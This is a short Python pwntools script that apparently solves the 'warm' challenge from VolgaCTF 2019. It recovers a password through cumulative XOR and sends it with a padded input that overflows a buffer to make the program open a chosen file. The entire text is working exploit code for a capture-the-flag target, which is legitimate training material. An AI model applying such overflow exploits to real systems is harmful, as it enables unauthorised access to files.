#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('qemu-arm-static -L /usr/arm-linux-gnueabihf ./warm', shell=True)
elif sys.argv[1] == 'debug':
    s = process('qemu-arm-static -L /usr/arm-linux-gnueabihf -g 1234 ./warm', shell=True)
else:
    s = remote('warm.q.2019.volgactf.ru', 443)

x = [0x76, 0x4e, 0x1e, 0x15, 0x5e, 0x1c, 0x21, 0x1, 0x34, 0x7, 0x35, 0x11, 0x37, 0x3c, 0x72, 0x47]
password = ''.join(map(chr, [reduce(lambda a, b: a^b, x[:i+1], 0) for i, _ in enumerate(x)]))

s.sendline(password.ljust(100, 'A') + 'sacred\0')
s.stream()
